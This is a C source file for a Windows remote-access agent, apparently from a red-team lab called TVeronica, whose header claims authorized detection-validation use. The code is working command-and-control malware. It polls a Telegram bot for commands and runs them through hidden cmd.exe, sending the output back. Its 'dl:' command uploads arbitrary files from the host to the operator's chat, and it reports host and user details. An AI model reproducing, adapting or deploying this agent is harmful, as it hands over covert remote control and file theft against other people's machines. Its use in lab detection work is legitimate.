/* c2core.c - TVeronica lab: Telegram bot long-poll agent core.
   Authorized red team / detection-validation lab only.
   Stage 5 C2: Telegram getUpdates long-poll -> command -> cmd.exe -> sendMessage/sendDocument. */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "c2config.h"
#include "c2core.h"

static long long g_offset = 0;

/* ---------------- helpers ---------------- */
static WCHAR *widen(const char *s) {
    int n = MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    WCHAR *w = (WCHAR *)malloc(n * sizeof(WCHAR));
    if (w) MultiByteToWideChar(CP_UTF8, 0, s, -1, w, n);
    return w;
}

static void urlenc(const char *s, char *o, size_t cap) {
    static const char *hex = "0123456789ABCDEF";
    size_t n = 0;
    for (; *s && n + 4 < cap; s++) {
        unsigned char c = (unsigned char)*s;
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
            (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~') {
            o[n++] = (char)c;
        } else {
            o[n++] = '%'; o[n++] = hex[c >> 4]; o[n++] = hex[c & 15];
        }
    }
    o[n] = 0;
}

static const char *jfind(const char *json, const char *key) {
    char pat[80];
    snprintf(pat, sizeof pat, "\"%s\"", key);
    const char *p = strstr(json, pat);
    if (!p) return NULL;
    p += strlen(pat);
    while (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r') p++;
    if (*p != ':') return NULL;
    p++;
    while (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r') p++;
    return p;
}

static void jstr(const char *json, const char *key, char *out, size_t cap) {
    const char *p = jfind(json, key);
    if (!p || *p != '"') { if (cap) out[0] = 0; return; }
    p++;
    size_t n = 0;
    while (*p && *p != '"' && n + 1 < cap) {
        if (*p == '\\' && p[1]) {
            p++;
            char c = *p;
            if (c == 'n') c = '\n';
            else if (c == 't') c = '\t';
            else if (c == 'r') c = '\r';
            out[n++] = c;
            p++;
        } else {
            out[n++] = *p++;
        }
    }
    out[n] = 0;
}

/* ---------------- HTTP (WinHTTP, TLS) ---------------- */
static int http_req(const char *method, const char *path,
                    const char *ctype, const void *body, DWORD blen,
                    char *out, DWORD cap)
{
    int rc = -1;
    WCHAR *wm = widen(method);
    WCHAR *wp = widen(path);
    WCHAR *wc = ctype ? widen(ctype) : NULL;
    if (!wm || !wp) goto done;

    HINTERNET h = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                              WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!h) goto done;
    WinHttpSetTimeouts(h, 8000, 8000, 90000, 90000);

    HINTERNET c = WinHttpConnect(h, TG_HOST_W, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!c) { WinHttpCloseHandle(h); goto done; }

    HINTERNET r = WinHttpOpenRequest(c, wm, wp, NULL, WINHTTP_NO_REFERER,
                                     WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(h); goto done; }

    WCHAR hdr[256] = L"";
    if (wc) _snwprintf(hdr, 255, L"Content-Type: %s", wc);

    if (WinHttpSendRequest(r, hdr[0] ? hdr : NULL, hdr[0] ? (DWORD)-1 : 0,
                           (LPVOID)body, blen, blen, 0) &&
        WinHttpReceiveResponse(r, NULL))
    {
        DWORD total = 0, n = 0;
        if (out && cap) {
            while (total + 1 < cap && WinHttpQueryDataAvailable(r, &n) && n > 0) {
                DWORD want = cap - 1 - total;
                if (want > n) want = n;
                if (!WinHttpReadData(r, out + total, want, &n)) break;
                total += n;
            }
            out[total] = 0;
        }
        rc = (int)total;
    }
    WinHttpCloseHandle(r);
    WinHttpCloseHandle(c);
    WinHttpCloseHandle(h);
done:
    free(wm); free(wp); free(wc);
    return rc;
}

static int tg_get(const char *ep, char *out, DWORD cap) {
    char path[1024];
    snprintf(path, sizeof path, "/bot%s/%s", TG_TOKEN, ep);
    return http_req("GET", path, NULL, NULL, 0, out, cap);
}

static int tg_post(const char *ep, const char *body, DWORD blen,
                   const char *ctype, char *out, DWORD cap) {
    char path[1024];
    snprintf(path, sizeof path, "/bot%s/%s", TG_TOKEN, ep);
    return http_req("POST", path, ctype ? ctype : "application/x-www-form-urlencoded",
                    body, blen, out, cap);
}

/* ---------------- Telegram actions ---------------- */
static void send_msg(long long chat, const char *text) {
    char enc[12288], body[13312], resp[2048];
    urlenc(text, enc, sizeof enc);
    snprintf(body, sizeof body, "chat_id=%lld&text=%s", chat, enc);
    tg_post("sendMessage", body, (DWORD)strlen(body), NULL, resp, sizeof resp);
}

static int send_doc(long long chat, const char *fp) {
    HANDLE f = CreateFileA(fp, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (f == INVALID_HANDLE_VALUE) return -1;
    DWORD sz = GetFileSize(f, NULL);
    if (sz == INVALID_FILE_SIZE || sz > 20u * 1024 * 1024) { CloseHandle(f); return -1; }
    BYTE *fbuf = (BYTE *)malloc(sz ? sz : 1);
    DWORD rd = 0;
    ReadFile(f, fbuf, sz, &rd, NULL);
    CloseHandle(f);

    const char *name = strrchr(fp, '\\');
    name = name ? name + 1 : fp;
    const char *bn = strrchr(name, '/');
    if (bn) name = bn + 1;

    static const char bnd[] = "----tvbnd91a7";
    char head[1024], tail[64];
    int hlen = snprintf(head, sizeof head,
        "--%s\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n%lld\r\n"
        "--%s\r\nContent-Disposition: form-data; name=\"document\"; filename=\"%s\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n",
        bnd, chat, bnd, name);
    int tlen = snprintf(tail, sizeof tail, "\r\n--%s--\r\n", bnd);

    DWORD total = (DWORD)(hlen + (int)rd + tlen);
    BYTE *body = (BYTE *)malloc(total);
    memcpy(body, head, hlen);
    memcpy(body + hlen, fbuf, rd);
    memcpy(body + hlen + rd, tail, tlen);

    char ctype[128], resp[2048];
    snprintf(ctype, sizeof ctype, "multipart/form-data; boundary=%s", bnd);
    int r = tg_post("sendDocument", (const char *)body, total, ctype, resp, sizeof resp);
    free(fbuf); free(body);
    return r;
}

/* ---------------- command execution ---------------- */
static void run_cmd(const char *cmd, char *out, DWORD cap) {
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof sa;
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    HANDLE rd = NULL, wr = NULL;
    if (!CreatePipe(&rd, &wr, &sa, 0)) { snprintf(out, cap, "[!] pipe error"); return; }
    SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof si);
    si.cb = sizeof si;
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = wr;
    si.hStdError = wr;
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof pi);

    char cl[4300];
    snprintf(cl, sizeof cl, "cmd.exe /c %s", cmd);
    if (!CreateProcessA(NULL, cl, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        CloseHandle(rd); CloseHandle(wr);
        snprintf(out, cap, "[!] CreateProcess error %lu", GetLastError());
        return;
    }
    CloseHandle(wr);

    DWORD total = 0, n = 0;
    while (total + 1 < cap && ReadFile(rd, out + total, cap - 1 - total, &n, NULL) && n > 0) {
        total += n;
        if (total >= 3800) break;   /* keep under sendMessage limits */
    }
    out[total] = 0;
    if (WaitForSingleObject(pi.hProcess, 20000) == WAIT_TIMEOUT)
        TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(rd);
}

/* ---------------- probe mode (lab smoke test) ---------------- */
int probe_mode(const char *who) {
    char t[MAX_PATH], f[MAX_PATH], o[MAX_PATH];
    GetTempPathA(MAX_PATH, t);
    snprintf(f, sizeof f, "%stveronica_probe", t);
    if (GetFileAttributesA(f) == INVALID_FILE_ATTRIBUTES) return 0;
    snprintf(o, sizeof o, "%stver_%s_ok.txt", t, who);
    HANDLE h = CreateFileA(o, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        char b[128];
        int l = snprintf(b, sizeof b, "%s loaded ok pid=%lu\r\n", who, GetCurrentProcessId());
        DWORD w = 0;
        WriteFile(h, b, (DWORD)l, &w, NULL);
        CloseHandle(h);
    }
    return 1;
}

/* ---------------- main loop (Stage 5) ---------------- */
void c2_run(const char *self) {
    char ep[512], resp[65536];

    /* drain stale updates from previous sessions */
    snprintf(ep, sizeof ep, "getUpdates?offset=-999&timeout=0");
    if (tg_get(ep, resp, sizeof resp) > 0) {
        long long mx = 0;
        const char *p = resp;
        while ((p = strstr(p, "\"update_id\":"))) {
            long long v = strtoll(p + 12, NULL, 10);
            if (v > mx) mx = v;
            p += 12;
        }
        g_offset = mx + 1;
    }

    for (;;) {
        snprintf(ep, sizeof ep, "getUpdates?offset=%lld&timeout=%d", g_offset, TG_POLL_SECS);
        int n = tg_get(ep, resp, sizeof resp);
        if (n <= 0) { Sleep(5000); continue; }

        const char *u = strstr(resp, "\"update_id\":");
        if (!u) { Sleep(1500); continue; }
        g_offset = strtoll(u + 12, NULL, 10) + 1;

        long long chat = 0;
        const char *ck = strstr(resp, "\"chat\":");
        if (ck) {
            const char *idk = strstr(ck, "\"id\":");
            if (idk) chat = strtoll(idk + 4, NULL, 10);
        }
        char text[4096];
        jstr(resp, "text", text, sizeof text);
        if (!chat || !text[0]) continue;

        if (_stricmp(text, "die") == 0) {
            send_msg(chat, "[x] agent exit");
            break;
        }
        if (_stricmp(text, "info") == 0) {
            char comp[MAX_PATH] = "", usr[MAX_PATH] = "", inf[1024];
            DWORD cl = MAX_PATH, ul = MAX_PATH;
            GetComputerNameA(comp, &cl);
            GetUserNameA(usr, &ul);
            snprintf(inf, sizeof inf, "[i] host=%s user=%s pid=%lu (%s)",
                     comp, usr, GetCurrentProcessId(), self ? self : "");
            send_msg(chat, inf);
            continue;
        }
        if (_strnicmp(text, "dl:", 3) == 0) {
            int r = send_doc(chat, text + 3);
            send_msg(chat, r > 0 ? "[+] document sent" : "[!] send failed");
            continue;
        }

        /* default: shell */
        {
            char *out = (char *)malloc(1 << 16);
            if (out) {
                run_cmd(text, out, 1 << 16);
                send_msg(chat, out[0] ? out : "(no output)");
                free(out);
            }
        }
    }
}
